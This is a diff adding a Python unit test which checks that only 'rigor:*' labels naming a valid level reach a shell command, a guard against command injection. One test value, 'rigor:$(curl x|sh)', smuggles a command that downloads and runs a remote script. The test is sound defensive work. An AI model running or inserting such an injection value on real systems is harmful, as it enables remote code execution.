@@ -482,6 +482,15 @@ class OfferTests(unittest.TestCase):
         self.assertEqual(offer["target_labels"], ["rigor:medium"])
         self.assertIsNone(rigor.offer(self.fact("light", "light", unread=True))["target_labels"])  # unread: no write
 
+    def test_only_labels_naming_a_level_are_removable(self):
+        # SEC-3 (PR #199): the coordinator's write puts these names in a shell command, so a `rigor:*` label naming
+        # no level — text anyone who can create a label wrote — never reaches it; a case variant keeps its name.
+        own = ["bug", "rigor:$(curl x|sh)", "rigor:bogus", "Rigor:Light", "rigor:medium"]
+        self.assertEqual(rigor.offer(self.fact("light", "light", own=own))["target_labels"],
+                         ["Rigor:Light", "rigor:medium"])
+        # Any `rigor:*` label still suppresses the first-run card, as before.
+        self.assertFalse(rigor.offer(self.fact("light", "light", own=["rigor:bogus"]))["first_run"])
+
     def test_differs_names_each_offered_levels_steps_off_full(self):
         differs = rigor.offer(self.fact("light", "light"))["differs"]
         self.assertEqual(sorted(differs), ["full", "light", "medium"])
